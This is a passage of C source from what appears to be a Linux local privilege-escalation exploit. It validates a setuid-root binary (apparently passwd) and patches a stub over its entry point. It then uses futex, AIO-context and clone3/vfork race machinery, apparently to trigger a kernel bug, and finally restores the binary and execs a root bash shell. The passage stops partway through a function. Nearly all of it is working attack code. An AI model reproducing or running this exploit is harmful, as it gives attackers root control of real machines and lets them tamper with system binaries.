static int payload_handoff_resolve_target_geometry(int fd,
						   const struct stat *status)
{
	uint8_t header[64];
	uint8_t program[56];
	uint64_t entry;
	uint64_t table;
	uint16_t entry_size;
	uint16_t count;
	uint16_t machine;
	off_t patch = 0;

	if (status->st_size < (off_t)sizeof(header) ||
	    status->st_size > (off_t)PAYLOAD_HANDOFF_TARGET_MAX_BYTES ||
	    payload_handoff_read_exact_at(fd, header, sizeof(header), 0, 0) !=
		    0 ||
	    memcmp(header, "\177ELF\002\001\001", 7) != 0)
		return -1;
	memcpy(&machine, header + 18, sizeof(machine));
	if (machine != 62)
		return -1;
	memcpy(&entry, header + 24, sizeof(entry));
	memcpy(&table, header + 32, sizeof(table));
	memcpy(&entry_size, header + 54, sizeof(entry_size));
	memcpy(&count, header + 56, sizeof(count));
	if (entry_size != sizeof(program) || count == 0 || count > 128)
		return -1;
	for (uint16_t index = 0; index < count; ++index) {
		uint64_t offset;
		uint64_t vaddr;
		uint64_t filesz;
		uint32_t type;

		if (payload_handoff_read_exact_at(
			    fd, program, sizeof(program),
			    (off_t)(table + (uint64_t)index * entry_size),
			    0) != 0)
			return -1;
		memcpy(&type, program, sizeof(type));
		memcpy(&offset, program + 8, sizeof(offset));
		memcpy(&vaddr, program + 16, sizeof(vaddr));
		memcpy(&filesz, program + 32, sizeof(filesz));
		if (type != PT_LOAD_TYPE || entry < vaddr ||
		    entry - vaddr >= filesz)
			continue;
		patch = (off_t)(offset + (entry - vaddr));
		break;
	}
	if (patch <= 0 || patch % 4096 == 0 ||
	    patch > status->st_size - PAYLOAD_STUB_BYTES ||
	    (patch + PAYLOAD_STUB_BYTES - 1) / 4096 != (patch - 1) / 4096)
		return -1;
	payload_handoff_target_bytes = (size_t)status->st_size;
	payload_handoff_patch_offset = patch;
	payload_handoff_splice_offset = patch - 1;
	return 0;
}

static int payload_handoff_compute_target_digests(int fd)
{
	uint8_t *image = malloc(payload_handoff_target_bytes);

	if (image == NULL)
		return -1;
	if (payload_handoff_read_exact_at(
		    fd, image, payload_handoff_target_bytes, 0, 1) != 0) {
		free(image);
		return -1;
	}
	memcpy(payload_handoff_original_entry,
	       image + payload_handoff_patch_offset, PAYLOAD_STUB_BYTES);
	payload_handoff_hash_memory(image, payload_handoff_target_bytes,
				    payload_handoff_digest_original);
	memcpy(image + payload_handoff_patch_offset, payload_handoff_entry_stub,
	       PAYLOAD_PREFIX_BYTES);
	payload_handoff_hash_memory(image, payload_handoff_target_bytes,
				    payload_digest_partial);
	memcpy(image + payload_handoff_patch_offset, payload_handoff_entry_stub,
	       PAYLOAD_STUB_BYTES);
	payload_handoff_hash_memory(image, payload_handoff_target_bytes,
				    payload_digest_complete);
	free(image);
	return memcmp(payload_handoff_digest_original, payload_digest_complete,
		      32) != 0 ?
		       0 :
		       -1;
}

static int
payload_handoff_target_preflight(int fd,
				 struct payload_handoff_fd_identity *identity)
{
	struct statvfs filesystem;
	struct stat status;

	if (payload_handoff_capture_identity(fd, identity) != 0 ||
	    !S_ISREG(identity->mode) || identity->uid != 0 ||
	    identity->gid != 0 || (identity->mode & 07777U) != 04755U ||
	    identity->nlink != 1 ||
	    (identity->status_flags & (O_ACCMODE | O_PATH)) != O_RDONLY ||
	    fstatvfs(fd, &filesystem) != 0 ||
	    (filesystem.f_flag & ST_NOSUID) != 0 || fstat(fd, &status) != 0 ||
	    payload_handoff_resolve_target_geometry(fd, &status) != 0 ||
	    payload_handoff_compute_target_digests(fd) != 0)
		return -1;
	return 0;
}

static int payload_handoff_create_fixed_descriptors(
	struct payload_handoff_run_record *record, int *result_read_out)
{
	int pipefd[2] = { -1, -1 };
	int fd = -1;
	int target_temp = -1;
	struct payload_handoff_fd_identity target_identity;
	uint8_t readback[sizeof(*record)];
	int seals = F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE;

	for (int fixed = PAYLOAD_HANDOFF_FIRST_FIXED_FD;
	     fixed <= PAYLOAD_HANDOFF_LAST_FIXED_FD; ++fixed) {
		if (payload_handoff_get_fd_flags(fixed) >= 0 || errno != EBADF)
			goto fail;
	}
	fd = open(payload_handoff_target_dir,
		  O_PATH | O_DIRECTORY | O_NOFOLLOW | O_CLOEXEC);
	if (fd < 0 ||
	    payload_handoff_install_fd(fd, PAYLOAD_HANDOFF_FD_BIN_DIR) != 0)
		goto fail;
	fd = -1;
	target_temp = openat(PAYLOAD_HANDOFF_FD_BIN_DIR,
			     payload_handoff_target_path,
			     O_RDONLY | O_NOFOLLOW | O_CLOEXEC);
	if (target_temp < 0 ||
	    payload_handoff_target_preflight(target_temp, &target_identity) !=
		    0 ||
	    payload_handoff_install_fd(target_temp,
				       PAYLOAD_HANDOFF_FD_TARGET) != 0)
		goto fail;
	target_temp = -1;
	fd = open("/", O_PATH | O_DIRECTORY | O_NOFOLLOW | O_CLOEXEC);
	if (fd < 0 ||
	    payload_handoff_install_fd(fd, PAYLOAD_HANDOFF_FD_ROOT_DIR) != 0)
		goto fail;
	fd = -1;
	fd = (int)syscall(SYS_memfd_create, "futex-run-record",
			  MFD_CLOEXEC | MFD_ALLOW_SEALING);
	if (fd < 0 ||
	    payload_handoff_install_fd(fd, PAYLOAD_HANDOFF_FD_RECORD) != 0)
		goto fail;
	fd = -1;
	fd = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
	if (fd < 0 ||
	    payload_handoff_install_fd(fd, PAYLOAD_HANDOFF_FD_SELF) != 0)
		goto fail;
	fd = -1;
	if (pipe2(pipefd, O_CLOEXEC) != 0 ||
	    payload_handoff_install_fd(pipefd[1], PAYLOAD_HANDOFF_FD_RESULT) !=
		    0)
		goto fail;
	pipefd[1] = -1;
	if (ftruncate(PAYLOAD_HANDOFF_FD_RECORD, (off_t)sizeof(*record)) != 0 ||
	    payload_handoff_run_record_init(record) != 0)
		goto fail;
	for (int fixed = PAYLOAD_HANDOFF_FIRST_FIXED_FD;
	     fixed <= PAYLOAD_HANDOFF_LAST_FIXED_FD; ++fixed)
		if (payload_handoff_capture_identity(
			    fixed,
			    &record->fd[fixed -
					PAYLOAD_HANDOFF_FIRST_FIXED_FD]) != 0)
			goto fail;
	if (record->fd[PAYLOAD_HANDOFF_FD_TARGET -
		       PAYLOAD_HANDOFF_FIRST_FIXED_FD]
			    .dev != target_identity.dev ||
	    record->fd[PAYLOAD_HANDOFF_FD_TARGET -
		       PAYLOAD_HANDOFF_FIRST_FIXED_FD]
			    .ino != target_identity.ino ||
	    payload_handoff_validate_fixed_types(record) != 0 ||
	    record->fd[PAYLOAD_HANDOFF_FD_SELF - PAYLOAD_HANDOFF_FIRST_FIXED_FD]
			    .size == 0 ||
	    payload_handoff_write_exact_at(PAYLOAD_HANDOFF_FD_RECORD, record,
					   sizeof(*record), 0) != 0 ||
	    fcntl(PAYLOAD_HANDOFF_FD_RECORD, F_ADD_SEALS, seals) != 0 ||
	    fcntl(PAYLOAD_HANDOFF_FD_RECORD, F_GET_SEALS) != seals ||
	    payload_handoff_read_exact_at(PAYLOAD_HANDOFF_FD_RECORD, readback,
					  sizeof(readback), 0, 1) != 0 ||
	    memcmp(readback, record, sizeof(*record)) != 0)
		goto fail;
	*result_read_out = pipefd[0];
	return 0;

fail:
	if (fd >= 0)
		(void)close(fd);
	if (target_temp >= 0)
		(void)close(target_temp);
	if (pipefd[0] >= 0)
		(void)close(pipefd[0]);
	if (pipefd[1] >= 0)
		(void)close(pipefd[1]);
	payload_handoff_close_fixed_all();
	return -1;
}

static void PAYLOAD_HANDOFF_NORETURN
payload_handoff_effect_wait_exec(struct payload_handoff_shared *shared)
{
	struct payload_handoff_run_record record;
	struct payload_handoff_ids ids;
	char *const target_argv[] = { (char *)"passwd", NULL };
	char *const target_envp[] = { NULL };

	if (shared == NULL || payload_handoff_effect_close_unlisted() != 0 ||
	    payload_handoff_fixed_fds_ok() != 0 ||
	    payload_handoff_load_sealed_record(&record) != 0 ||
	    memcmp(&record, &shared->record, sizeof(record)) != 0 ||
	    payload_handoff_require_fixed_identities(&record) != 0 ||
	    payload_handoff_capture_ids(&ids) != 0 ||
	    !payload_handoff_ids_are_start(&ids) ||
	    payload_handoff_nnp_is(0) != 0 ||
	    payload_handoff_verify_target_hash(
		    PAYLOAD_HANDOFF_FD_TARGET,
		    PAYLOAD_HANDOFF_TARGET_ORIGINAL) != 0)
		payload_handoff_effect_fail(shared, 101);
	atomic_store_explicit(&shared->effect_ready, 1, memory_order_release);
	(void)payload_handoff_futex_wake(&shared->effect_ready, INT_MAX);
	for (;;) {
		int value = atomic_load_explicit(
			&shared->parent_no_new_privs_enabled,
			memory_order_acquire);

		if (value >= 1)
			break;
		(void)payload_handoff_futex_wait(
			&shared->parent_no_new_privs_enabled, value, NULL);
	}
	if (payload_handoff_nnp_is(0) != 0 ||
	    payload_handoff_capture_ids(&ids) != 0 ||
	    !payload_handoff_ids_are_start(&ids) ||
	    payload_handoff_fixed_fds_ok() != 0)
		payload_handoff_effect_fail(shared, 102);
	for (;;) {
		int value = atomic_load_explicit(&shared->effect_go,
						 memory_order_acquire);

		if (value >= 1)
			break;
		(void)payload_handoff_futex_wait(&shared->effect_go, value,
						 NULL);
	}
	if (payload_handoff_nnp_is(0) != 0 ||
	    payload_handoff_capture_ids(&ids) != 0 ||
	    !payload_handoff_ids_are_start(&ids) ||
	    payload_handoff_fixed_fds_ok() != 0 ||
	    payload_handoff_require_fixed_identities(&record) != 0 ||
	    payload_handoff_verify_target_hash(PAYLOAD_HANDOFF_FD_TARGET,
					       TARGET_FULLY_PATCHED) != 0)
		payload_handoff_effect_fail(shared, 103);
	(void)syscall(SYS_execveat, PAYLOAD_HANDOFF_FD_TARGET, "", target_argv,
		      target_envp, AT_EMPTY_PATH);
	payload_handoff_effect_fail(shared, 104);
}

static int payload_handoff_prepare_effect(struct payload_handoff_shared *shared,
					  int *result_read_out)
{
	struct payload_handoff_run_record record;
	struct payload_handoff_ids ids;
	pid_t child;
	int result_read = -1;

	if (shared == NULL || result_read_out == NULL ||
	    payload_handoff_capture_ids(&ids) != 0 ||
	    !payload_handoff_ids_are_start(&ids) ||
	    payload_handoff_nnp_is(0) != 0)
		return -1;
	memset(shared, 0, sizeof(*shared));
	atomic_init(&shared->effect_ready, 0);
	atomic_init(&shared->parent_no_new_privs_enabled, 0);
	atomic_init(&shared->effect_go, 0);
	atomic_init(&shared->effect_error, 0);
	atomic_init(&shared->effect_pid, 0);
	if (payload_handoff_create_fixed_descriptors(&record, &result_read) !=
	    0)
		return -1;
	shared->record = record;
	atomic_thread_fence(memory_order_release);
	child = fork();
	if (child == 0)
		payload_handoff_effect_wait_exec(shared);
	if (child < 0)
		goto fail;
	atomic_store_explicit(&shared->effect_pid, child, memory_order_release);
	if (payload_handoff_wait_at_least(&shared->effect_ready, 1, 5000) !=
		    0 ||
	    atomic_load_explicit(&shared->effect_error, memory_order_acquire) !=
		    0)
		goto fail_child;
	*result_read_out = result_read;
	return 0;

fail_child:
	(void)kill(child, SIGKILL);
	(void)waitpid(child, NULL, 0);
fail:
	if (result_read >= 0)
		(void)close(result_read);
	payload_handoff_close_fixed_all();
	return -1;
}

static int payload_handoff_publish_parent_no_new_privs(
	struct payload_handoff_shared *shared)
{
	if (shared == NULL || payload_handoff_nnp_is(1) != 0 ||
	    atomic_load_explicit(&shared->effect_ready, memory_order_acquire) !=
		    1 ||
	    atomic_load_explicit(&shared->effect_error, memory_order_acquire) !=
		    0)
		return -1;
	atomic_store_explicit(&shared->parent_no_new_privs_enabled, 1,
			      memory_order_release);
	(void)payload_handoff_futex_wake(&shared->parent_no_new_privs_enabled,
					 INT_MAX);
	return 0;
}

static int payload_handoff_effect_release(struct payload_handoff_shared *shared)
{
	if (shared == NULL || payload_handoff_nnp_is(1) != 0 ||
	    atomic_load_explicit(&shared->effect_ready, memory_order_acquire) !=
		    1 ||
	    atomic_load_explicit(&shared->parent_no_new_privs_enabled,
				 memory_order_acquire) != 1 ||
	    atomic_load_explicit(&shared->effect_error, memory_order_acquire) !=
		    0 ||
	    payload_handoff_verify_target_hash(PAYLOAD_HANDOFF_FD_TARGET,
					       TARGET_FULLY_PATCHED) != 0)
		return -1;
	atomic_store_explicit(&shared->effect_go, 1, memory_order_release);
	(void)payload_handoff_futex_wake(&shared->effect_go, INT_MAX);
	return 0;
}

static void PAYLOAD_HANDOFF_NORETURN payload_handoff_root_fail(int code)
{
	int saved_errno = errno;

	(void)dprintf(STDERR_FILENO, "[-] root stage failed at %d (errno %d)\n",
		      code, saved_errno);
	payload_handoff_park();
}

static int payload_handoff_root_stage_selected(void)
{
	struct payload_handoff_run_record record;
	uid_t ruid;
	uid_t euid;
	uid_t suid;

	return getresuid(&ruid, &euid, &suid) == 0 && ruid == 0 && euid == 0 &&
			       suid == 0 &&
			       payload_handoff_fixed_fds_ok() == 0 &&
			       payload_handoff_load_sealed_record(&record) ==
				       0 ?
		       1 :
		       0;
}

static void PAYLOAD_HANDOFF_NORETURN payload_handoff_root_stage(void)
{
	static char *const shell_argv[] = { (char *)"-bash", NULL };
	static char *const shell_envp[] = {
		(char *)"HOME=/root",
		(char *)"USER=root",
		(char *)"LOGNAME=root",
		(char *)"SHELL=/bin/bash",
		(char *)"TERM=xterm-256color",
		(char *)"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:"
			"/usr/bin:/sbin:/bin",
		NULL,
	};
	struct payload_handoff_run_record record;
	struct payload_handoff_ids ids;
	int fd;

	payload_handoff_start_uid = 0;
	payload_handoff_start_gid = 0;
	(void)signal(SIGINT, SIG_DFL);
	(void)signal(SIGQUIT, SIG_DFL);
	(void)signal(SIGHUP, SIG_DFL);
	(void)signal(SIGTSTP, SIG_DFL);
	if (payload_handoff_load_sealed_record(&record) != 0 ||
	    payload_handoff_require_fixed_identities(&record) != 0 ||
	    payload_handoff_capture_ids(&ids) != 0 ||
	    !payload_handoff_ids_are(&ids, 0) || payload_handoff_nnp_is(0) != 0)
		payload_handoff_root_fail(201);
	payload_handoff_target_bytes = (size_t)record.target_bytes;
	payload_handoff_patch_offset = (off_t)record.patch_offset;
	payload_handoff_splice_offset = payload_handoff_patch_offset - 1;
	memcpy(payload_handoff_digest_original, record.target_original_sha256,
	       32);
	memcpy(payload_digest_partial, record.target_partial_sha256, 32);
	memcpy(payload_digest_complete, record.target_patched_sha256, 32);
	memcpy(payload_handoff_original_entry, record.original_entry,
	       PAYLOAD_STUB_BYTES);
	if (payload_handoff_verify_target_hash(PAYLOAD_HANDOFF_FD_TARGET,
					       TARGET_FULLY_PATCHED) != 0 ||
	    close(PAYLOAD_HANDOFF_FD_TARGET) != 0)
		payload_handoff_root_fail(202);
	fd = openat(PAYLOAD_HANDOFF_FD_BIN_DIR, payload_handoff_target_path,
		    O_WRONLY | O_NOFOLLOW | O_CLOEXEC);
	if (fd < 0 ||
	    payload_handoff_target_metadata_fd(
		    fd, &record.fd[PAYLOAD_HANDOFF_FD_TARGET -
				   PAYLOAD_HANDOFF_FIRST_FIXED_FD]) != 0 ||
	    payload_handoff_write_exact_at(fd, record.original_entry,
					   PAYLOAD_STUB_BYTES,
					   payload_handoff_patch_offset) != 0 ||
	    fchmod(fd, 04755) != 0 || fsync(fd) != 0 || close(fd) != 0)
		payload_handoff_root_fail(203);
	fd = openat(PAYLOAD_HANDOFF_FD_BIN_DIR, payload_handoff_target_path,
		    O_RDONLY | O_NOFOLLOW | O_CLOEXEC);
	if (fd < 0 ||
	    payload_handoff_target_metadata_fd(
		    fd, &record.fd[PAYLOAD_HANDOFF_FD_TARGET -
				   PAYLOAD_HANDOFF_FIRST_FIXED_FD]) != 0 ||
	    payload_handoff_verify_target_hash(
		    fd, PAYLOAD_HANDOFF_TARGET_ORIGINAL) != 0 ||
	    close(fd) != 0)
		payload_handoff_root_fail(204);

	if (payload_handoff_write_pipe_exact(PAYLOAD_HANDOFF_FD_RESULT, "R",
					     1) != 0)
		payload_handoff_root_fail(205);
	payload_handoff_close_fixed_all();
	(void)dprintf(STDOUT_FILENO,
		      "[+] uid=0 gid=0, %s/%s restored - root shell\n",
		      payload_handoff_target_dir, payload_handoff_target_path);
	(void)execve("/bin/bash", shell_argv, shell_envp);
	(void)execve("/bin/sh", shell_argv, shell_envp);

	(void)dprintf(STDERR_FILENO, "[-] no usable shell to exec (errno %d)\n",
		      errno);
	_exit(1);
}

#define PI_RESERVOIR_AIO_HEARTBEAT_MAGIC UINT64_C(0x504952455341494f)
#define PI_RESERVOIR_AIO_PHASE_IDLE UINT64_C(0)
#define PI_RESERVOIR_AIO_PHASE_SETUP UINT64_C(1)
#define PI_RESERVOIR_AIO_PHASE_ARMED_SETUP UINT64_C(2)
#define PI_RESERVOIR_AIO_PHASE_STOPPING UINT64_C(3)

struct pi_reservoir_aio_heartbeat {
	uint64_t magic;
	uint64_t phase;
	uint64_t active_seq;
	uint64_t enter_ns;
	uint64_t exit_ns;
	uint64_t completed;
	uint64_t syscall_ret;
	uint64_t max_duration_ns;
	uint64_t max_seq;
	uint64_t done;
	uint64_t stop_requested;
	uint64_t stop_ack;
};

#define SYS_IO_SETUP_X86_64 206
#define HEARTBEAT_ARM_BEGIN 17000UL

typedef unsigned long aio_context_local_t;

static uint64_t aio_worker_now_ns(void)
{
	struct timespec ts;

	if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0)
		return 0;
	return (uint64_t)ts.tv_sec * UINT64_C(1000000000) +
	       (uint64_t)ts.tv_nsec;
}

static int run_aio_reservoir_worker(void)
{
	aio_context_local_t *contexts;
	struct pi_reservoir_aio_heartbeat *heartbeat = aio_heartbeat;
	const size_t requested = AIO_RESERVOIR_CONTEXT_COUNT;
	uint64_t max_setup_ns = 0;
	size_t held = 0;
	int idle_entered = 0;
	struct payload_handoff_ids ids;
	cpu_set_t cpuset;

	CPU_ZERO(&cpuset);
	CPU_SET(3, &cpuset);
	if (heartbeat == NULL || payload_handoff_capture_ids(&ids) != 0 ||
	    !payload_handoff_ids_are_start(&ids) ||
	    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0 ||
	    prctl(PR_SET_NAME, "aio-prefill", 0, 0, 0) != 0 ||
	    sched_setaffinity(0, sizeof(cpuset), &cpuset) != 0)
		return 2;

	contexts = calloc(requested, sizeof(*contexts));
	if (!contexts)
		return 2;
	for (held = 0; held < requested; ++held) {
		uint64_t one_begin;
		uint64_t duration;
		uint64_t phase_expected = PI_RESERVOIR_AIO_PHASE_IDLE;
		long ret;
		int heartbeat_protocol_ok = 1;
		int stop_claimed = 0;
		struct sched_param idle_param = { .sched_priority = 0 };

		if (!idle_entered && held + 1 >= HEARTBEAT_ARM_BEGIN) {
			if (sched_setscheduler(0, SCHED_IDLE, &idle_param) != 0)
				break;
			idle_entered = 1;
		}
		contexts[held] = 0;
		one_begin = aio_worker_now_ns();
		__atomic_store_n(&heartbeat->completed, held, __ATOMIC_RELAXED);
		__atomic_store_n(&heartbeat->enter_ns, one_begin,
				 __ATOMIC_RELAXED);
		__atomic_store_n(&heartbeat->active_seq, held + 1,
				 __ATOMIC_RELAXED);
		__atomic_store_n(&heartbeat->phase,
				 held + 1 >= HEARTBEAT_ARM_BEGIN ?
					 PI_RESERVOIR_AIO_PHASE_ARMED_SETUP :
					 PI_RESERVOIR_AIO_PHASE_SETUP,
				 __ATOMIC_RELEASE);
		ret = syscall(SYS_IO_SETUP_X86_64, 1U, &contexts[held]);
		duration = aio_worker_now_ns() - one_begin;
		__atomic_store_n(&heartbeat->syscall_ret, (uint64_t)ret,
				 __ATOMIC_RELAXED);
		__atomic_store_n(&heartbeat->exit_ns, aio_worker_now_ns(),
				 __ATOMIC_RELAXED);
		phase_expected = held + 1 >= HEARTBEAT_ARM_BEGIN ?
					 PI_RESERVOIR_AIO_PHASE_ARMED_SETUP :
					 PI_RESERVOIR_AIO_PHASE_SETUP;
		if (__atomic_compare_exchange_n(
			    &heartbeat->phase, &phase_expected,
			    PI_RESERVOIR_AIO_PHASE_IDLE, 0, __ATOMIC_ACQ_REL,
			    __ATOMIC_ACQUIRE)) {
			__atomic_store_n(&heartbeat->active_seq, 0,
					 __ATOMIC_RELEASE);
		} else if (held + 1 >= HEARTBEAT_ARM_BEGIN &&
			   phase_expected == PI_RESERVOIR_AIO_PHASE_STOPPING) {
			uint64_t stop_deadline =
				aio_worker_now_ns() + UINT64_C(1000000000);

			while (__atomic_load_n(&heartbeat->stop_requested,
					       __ATOMIC_ACQUIRE) != 1) {
				if (aio_worker_now_ns() >= stop_deadline) {
					heartbeat_protocol_ok = 0;
					break;
				}
				__asm__ volatile("pause");
			}
			__atomic_store_n(&heartbeat->active_seq, 0,
					 __ATOMIC_RELEASE);
			__atomic_store_n(&heartbeat->phase,
					 PI_RESERVOIR_AIO_PHASE_IDLE,
					 __ATOMIC_RELEASE);
			stop_claimed = heartbeat_protocol_ok;
		} else {
			heartbeat_protocol_ok = 0;
			__atomic_store_n(&heartbeat->active_seq, 0,
					 __ATOMIC_RELEASE);
			__atomic_store_n(&heartbeat->phase,
					 PI_RESERVOIR_AIO_PHASE_IDLE,
					 __ATOMIC_RELEASE);
		}
		if (duration > max_setup_ns) {
			max_setup_ns = duration;
			__atomic_store_n(&heartbeat->max_duration_ns, duration,
					 __ATOMIC_RELAXED);
			__atomic_store_n(&heartbeat->max_seq, held + 1,
					 __ATOMIC_RELEASE);
		}
		if (ret != 0 || !heartbeat_protocol_ok)
			break;
		if (stop_claimed) {
			++held;
			__atomic_store_n(&heartbeat->completed, held,
					 __ATOMIC_RELEASE);
			__atomic_store_n(&heartbeat->stop_ack, 1,
					 __ATOMIC_RELEASE);
			break;
		}
		if (__atomic_load_n(&heartbeat->stop_requested,
				    __ATOMIC_ACQUIRE) != 0)
			break;
	}
	__atomic_store_n(&heartbeat->completed, held, __ATOMIC_RELEASE);
	__atomic_store_n(&heartbeat->done, 1, __ATOMIC_RELEASE);

	payload_handoff_park();
}

#define PI_RESERVOIR_AIO_STALL_THRESHOLD_NS UINT64_C(100000)

#define SYS_CLOCK_GETTIME_X86_64 228
#define SYS_EXIT_X86_64 60
#define SYS_FUTEX_X86_64 202
#define SYS_GETPID_X86_64 39
#define SYS_KILL_X86_64 62
#define SYS_PRCTL_X86_64 157
#define SYS_SCHED_SETAFFINITY_X86_64 203
#define SYS_SCHED_SETSCHEDULER_X86_64 144
#define SYS_SCHED_YIELD_X86_64 24

#define CLONE_VM_LOCAL UINT64_C(0x00000100)
#define CLONE_VFORK_LOCAL UINT64_C(0x00004000)
#define PR_FUTEX_HASH_LOCAL 78
#define PR_FUTEX_HASH_SET_SLOTS_LOCAL 1
#define STACK_SIZE (1UL << 20)
#define RESIZE_HASH_SLOTS (1UL << 18)

enum attempt_result {
	ATTEMPT_ERROR = 70,
	ATTEMPT_CANDIDATE = 42,
};

struct clone_args_local {
	uint64_t flags;
	uint64_t pidfd;
	uint64_t child_tid;
	uint64_t parent_tid;
	uint64_t exit_signal;
	uint64_t stack;
	uint64_t stack_size;
	uint64_t tls;
	uint64_t set_tid;
	uint64_t set_tid_size;
	uint64_t cgroup;
};

struct private_state {
	int vfork_bridge_pid;
	int resize_pid;
	int resize_ready;
	int resize_sched_rc;
	int resize_affinity_rc;
	long resize_prctl_ret;
	uint64_t resize_enter_ns;
	uint64_t resize_exit_ns;
};

struct controller_state {
	int ready;
	int resize_go;
	int gate_sent;
	int hog_request;
	int hog_active;
	int release_resize;
	int hog_done;
	uint64_t delay_ns;
	uint64_t resize_go_ns;
	uint64_t gate_ns;
	uint64_t hog_ns;
};

struct guarded_stack {
	void *mapping;
	void *usable;
};

static struct private_state state = {
	.resize_prctl_ret = LONG_MIN,
	.resize_sched_rc = INT_MIN,
	.resize_affinity_rc = INT_MIN,
};

static struct controller_state *controller;
static void *hash_resize_stack;

long raw_clone3_vfork_bridge(const struct clone_args_local *args, size_t size);
long raw_clone3_hash_resize(const struct clone_args_local *args, size_t size);
void vfork_bridge_entry(void) __attribute__((noreturn, noinline, used));
void hash_resize_entry(void) __attribute__((noreturn, noinline, used));

__asm__(".text\n"
	".p2align 4\n"
	".globl raw_clone3_vfork_bridge\n"
	".type raw_clone3_vfork_bridge,@function\n"
	"raw_clone3_vfork_bridge:\n"
	"mov $435, %eax\n"
	"syscall\n"
	"test %rax, %rax\n"
	"jnz 1f\n"
	"xor %ebp, %ebp\n"
	"call vfork_bridge_entry\n"
	"ud2\n"
	"1: ret\n"
	".size raw_clone3_vfork_bridge, .-raw_clone3_vfork_bridge\n"
	".p2align 4\n"
	".globl raw_clone3_hash_resize\n"
	".type raw_clone3_hash_resize,@function\n"
	"raw_clone3_hash_resize:\n"
	"mov $435, %eax\n"
	"syscall\n"
	"test %rax, %rax\n"
	"jnz 2f\n"
	"xor %ebp, %ebp\n"
	"call hash_resize_entry\n"
	"ud2\n"
	"2: ret\n"
	".size raw_clone3_hash_resize, .-raw_clone3_hash_resize\n");

static inline long raw_syscall0(long nr)
{
	register long rax __asm__("rax") = nr;

	__asm__ volatile("syscall" : "+a"(rax) : : "rcx", "r11", "memory");
	return rax;
}

static inline long raw_syscall1(long nr, long a1)
{
	register long rax __asm__("rax") = nr;

	__asm__ volatile("syscall"
			 : "+a"(rax)
			 : "D"(a1)
			 : "rcx", "r11", "memory");
	return rax;
}

static inline long raw_syscall2(long nr, long a1, long a2)
{
	register long rax __asm__("rax") = nr;

	__asm__ volatile("syscall"
			 : "+a"(rax)
			 : "D"(a1), "S"(a2)
			 : "rcx", "r11", "memory");
	return rax;
}

static inline long raw_syscall3(long nr, long a1, long a2, long a3)
{
	register long rax __asm__("rax") = nr;

	__asm__ volatile("syscall"
			 : "+a"(rax)
			 : "D"(a1), "S"(a2), "d"(a3)
			 : "rcx", "r11", "memory");
	return rax;
}

static inline long raw_syscall5(long nr, long a1, long a2, long a3, long a4,
				long a5)
{
	register long rax __asm__("rax") = nr;
	register long r10 __asm__("r10") = a4;
	register long r8 __asm__("r8") = a5;

	__asm__ volatile("syscall"
			 : "+a"(rax)
			 : "D"(a1), "S"(a2), "d"(a3), "r"(r10), "r"(r8)
			 : "rcx", "r11", "memory");
	return rax;
}

static inline long raw_syscall6(long nr, long a1, long a2, long a3, long a4,
				long a5, long a6)
{
	register long rax __asm__("rax") = nr;
	register long r10 __asm__("r10") = a4;
	register long r8 __asm__("r8") = a5;
	register long r9 __asm__("r9") = a6;

	__asm__ volatile("syscall"
			 : "+a"(rax)
			 : "D"(a1), "S"(a2), "d"(a3), "r"(r10), "r"(r8), "r"(r9)
			 : "rcx", "r11", "memory");
	return rax;
}

static void raw_exit(int status) __attribute__((noreturn));

static void raw_exit(int status)
{
	(void)raw_syscall1(SYS_EXIT_X86_64, status);
	__builtin_unreachable();
}

static uint64_t raw_monotonic_ns(void)
{
	struct {
		long tv_sec;
		long tv_nsec;
	} ts;

	if (raw_syscall2(SYS_CLOCK_GETTIME_X86_64, CLOCK_MONOTONIC,
			 (long)(uintptr_t)&ts) < 0)
		return 0;
	return (uint64_t)ts.tv_sec * UINT64_C(1000000000) +
	       (uint64_t)ts.tv_nsec;
}

static int raw_pin_cpu(unsigned int cpu)
{
	unsigned long mask = 1UL << cpu;

	return (int)raw_syscall3(SYS_SCHED_SETAFFINITY_X86_64, 0, sizeof(mask),
				 (long)(uintptr_t)&mask);
}

void vfork_bridge_entry(void)
{
	struct clone_args_local args = { 0 };
	long ret;

	__atomic_store_n(&state.vfork_bridge_pid,
			 (int)raw_syscall0(SYS_GETPID_X86_64),
			 __ATOMIC_RELEASE);
	args.flags = CLONE_VM_LOCAL | CLONE_VFORK_LOCAL;
	args.exit_signal = SIGCHLD;
	args.stack = (uint64_t)(uintptr_t)hash_resize_stack;
	args.stack_size = STACK_SIZE;
	ret = raw_clone3_hash_resize(&args, sizeof(args));
	(void)ret;
	raw_exit(24);
}

static uint64_t monotonic_ns(void)
{
	struct timespec ts;

	if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0)
		return 0;
	return (uint64_t)ts.tv_sec * UINT64_C(1000000000) +
	       (uint64_t)ts.tv_nsec;
}

static int sleep_until_ns(uint64_t deadline_ns)
{
	struct timespec deadline = {
		.tv_sec = (time_t)(deadline_ns / UINT64_C(1000000000)),
		.tv_nsec = (long)(deadline_ns % UINT64_C(1000000000)),
	};
	int ret;

	do {
		ret = clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME, &deadline,
				      NULL);
	} while (ret == EINTR);
	return ret;
}

static int pin_cpu(unsigned int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	return sched_setaffinity(0, sizeof(set), &set);
}

static struct guarded_stack allocate_stack(size_t usable_size)
{
	const long page_size = sysconf(_SC_PAGESIZE);
	const size_t total = usable_size + 2 * (size_t)page_size;
	struct guarded_stack stack = { 0 };

	if (page_size <= 0)
		return stack;
	stack.mapping = mmap(NULL, total, PROT_NONE,
			     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (stack.mapping == MAP_FAILED) {
		stack.mapping = NULL;
		return stack;
	}
	stack.usable = (char *)stack.mapping + page_size;
	if (mprotect(stack.usable, usable_size, PROT_READ | PROT_WRITE) != 0) {
		munmap(stack.mapping, total);
		stack.mapping = NULL;
		stack.usable = NULL;
	}
	return stack;
}

static int wait_value(const int *value, int wanted, uint64_t timeout_ns)
{
	uint64_t deadline = monotonic_ns() + timeout_ns;

	while (__atomic_load_n(value, __ATOMIC_ACQUIRE) != wanted) {
		if (monotonic_ns() >= deadline)
			return -1;
		sched_yield();
	}
	return 0;
}

static int verify_unprivileged_start(void)
{
	struct payload_handoff_ids ids;

	if (payload_handoff_capture_ids(&ids) != 0 ||
	    !payload_handoff_ids_are_start(&ids))
		return -1;
